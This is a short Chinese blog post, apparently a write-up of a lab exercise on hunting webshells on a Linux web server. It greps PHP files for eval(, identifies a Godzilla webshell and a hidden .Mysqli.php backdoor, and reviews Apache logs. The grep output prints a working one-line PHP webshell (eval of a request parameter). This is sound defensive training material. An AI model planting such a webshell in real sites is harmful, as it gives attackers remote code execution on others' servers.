---
layout: post
title: 玄机——第一章——webshell查杀
---

上线后我们快速搜索所有可能的后门文件后缀并匹配文件内容如`eval,exec`等。

```bash
find / type f  -name '*.php' | xargs grep "eval("
./var/www/html/include/gz.php:          eval($payload);
./var/www/html/include/Db/.Mysqli.php:          eval($payload);
./var/www/html/shell.php:<?php phpinfo();@eval($_REQUEST[1]);?>
```

我们依次翻看此三个文件。在gz.php中找出了第一个flag.通过鉴别文件名及开头三个标识`@session_start();@set_time_limit(0);@error_reporting(0);`可以得知此为哥斯拉的马，我们将哥斯拉的github地址薅下来md5一下。审计`apache2`访问日志，可以php://input的代码是走POST的记录不到。我们只能一个个文件夹查找`ls -al`看有无隐藏文件。发现`gz.php`的目录下还有一个Db文件夹，内部有一个隐藏的`.Musqli.php`文件。完整路径为`/var/www/html/include/Db/.Mysqli.php`.查杀apache2日志并`grep`一下`.php?`以查找所有给php文件传参的记录。查到一个top.php与index.php在进行传参行为。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/第一章-webshell查杀/01.png?raw=true)

wap文件夹下查看此两文件内容，index为正常业务文件，而top文件为免杀马。